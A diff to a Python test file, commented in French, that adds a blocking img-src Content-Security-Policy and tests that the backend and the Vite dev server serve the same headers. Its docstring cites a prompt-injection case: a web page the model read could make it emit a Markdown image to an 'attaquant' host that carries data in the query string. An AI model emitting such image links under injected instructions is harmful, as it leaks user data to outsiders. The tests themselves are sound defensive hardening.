@@ -1,15 +1,17 @@
 #!/usr/bin/env python3
-"""CSP en observation (Report-Only) et journal de ses violations.
+"""CSP : observation (Report-Only), ``img-src`` bloquant, journal des violations.
 
 Contexte : ``core/csp.py``, ``docs/etude-isolation-modules.md`` §3 c1. La CSP
-est posée en ``Report-Only`` et doit le rester tant qu'Ilyann n'a pas tranché
-(2026-09-26). Verrouille :
+complète est posée en ``Report-Only`` (2026-09-26) ; ``img-src`` seul est
+BLOQUANT depuis le 2026-10-18 (décision d'Ilyann, PR #66 : une page web lue
+pouvait faire écrire au modèle ``![](https://attaquant/?q=…)``). Verrouille :
 
   1. ``index.html`` servi par le backend porte ``Content-Security-Policy-Report-Only``
-     et JAMAIS l'en-tête bloquant ``Content-Security-Policy`` ;
+     (politique complète) ET ``Content-Security-Policy`` réduit à
+     ``img-src 'self' data: blob:`` — rien d'autre n'est bloquant ;
   2. la copie de ``frontend/vite.config.ts`` (serveur de dev, lancé par le
-     tray) est identique à ``core/csp.politique`` pour le backend sur :8000, et
-     elle aussi en Report-Only ;
+     tray) est identique à ``core/csp`` pour le backend sur :8000, avec les
+     deux mêmes en-têtes ;
   3. le point de collecte accepte les deux formats de rapport SANS token,
      agrège, réduit l'URL bloquée à son origine, borne la taille du corps ;
   4. le journal n'est lisible et vidable qu'avec le token.
@@ -78,7 +80,7 @@ class EnteteIndexTest(unittest.TestCase):
             os.environ["EPURE_WEB_DIR"] = self._web
         self._tmp.cleanup()
 
-    def test_index_en_report_only_jamais_bloquant(self):
+    def test_index_report_only_complet_et_img_src_bloquant(self):
         app = FastAPI()
         main._register_web(app)
         with TestClient(app) as c:
@@ -88,7 +90,16 @@ class EnteteIndexTest(unittest.TestCase):
         self.assertIn("report-uri /csp/report", r.headers["content-security-policy-report-only"])
         # report-uri seul : avec report-to, Chromium ne livrait rien (core/csp.py).
         self.assertNotIn("report-to", r.headers["content-security-policy-report-only"])
-        self.assertNotIn("content-security-policy", r.headers)
+
+        # En-tête BLOQUANT servi, exactement img-src + report-uri : une image
+        # distante n'est plus chargée, quelle que soit la façon dont elle est
+        # arrivée dans le DOM (Markdown, KaTeX, composant de module).
+        bloquant = r.headers.get("content-security-policy")
+        self.assertEqual(bloquant, "img-src 'self' data: blob:; report-uri /csp/report")
+        self.assertEqual(bloquant, csp.politique_bloquante())
+        # Rien d'autre n'est bloquant : connect-src reste en observation.
+        self.assertNotIn("connect-src", bloquant)
+        self.assertNotIn("content-security-policy", svg.headers)
         self.assertNotIn("content-security-policy-report-only", svg.headers)
 
 
@@ -102,7 +113,15 @@ class CopieViteTest(unittest.TestCase):
         self.assertEqual(vite, csp.politique(csp.ORIGINES_BACKEND_DEV, rapport=rapport))
         self.assertEqual(rapport, "http://localhost:8000" + csp.CHEMIN_RAPPORT)
         self.assertIn("'Content-Security-Policy-Report-Only': CSP_DEV", src)
-        self.assertNotRegex(src, r"'Content-Security-Policy'\s*:")
+
+    def test_vite_img_src_bloquant_identique_au_backend(self):
+        src = _VITE.read_text(encoding="utf-8")
+        rapport = re.search(r"const CSP_RAPPORT = '([^']+)'", src).group(1)
+        bloc = re.search(r"const CSP_DEV_BLOQUANTE = \[(.*?)\]\.join\('; '\)", src, re.S).group(1)
+        parties = [m.group(2) for m in re.finditer(r"""(["'`])(.*?)\1,""", bloc)]
+        vite = "; ".join(p.replace("${CSP_RAPPORT}", rapport) for p in parties)
+        self.assertEqual(vite, csp.politique_bloquante(rapport=rapport))
+        self.assertRegex(src, r"'Content-Security-Policy'\s*:\s*CSP_DEV_BLOQUANTE")
 
 
 class CollecteTest(unittest.TestCase):
